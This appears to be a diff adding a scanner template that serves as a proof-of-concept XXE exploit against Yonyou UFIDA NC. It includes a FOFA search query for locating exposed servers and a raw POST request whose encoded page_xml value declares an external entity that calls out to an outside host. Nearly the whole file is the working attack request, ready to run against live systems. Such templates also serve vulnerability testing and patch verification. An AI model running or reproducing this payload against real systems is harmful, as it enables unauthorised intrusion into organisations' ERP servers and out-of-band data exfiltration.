@@ -1,0 +1,36 @@
+id: poc-hae5zupap5nx79vr
+info:
+  name: 用友-UFIDA-NC content存在XXE实体注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hae5zupap5nx79vr'
+  tags: xxe,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hae5zupap5nx79vr
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/page/preview/content?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate, br, zstd
+
+    Connection: keep-alive
+
+
+    page_xml=%253C%2521DOCTYPE%2Broot%2B%255B%2B%253C%2521ENTITY%2B%2525%2Bremote%2BSYSTEM%2B%2522http%253A%252F%252Fyazfhfyxoa.zaza.eu.org%252F%2522%253E%2B%2525remote%253B%255D%253E'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
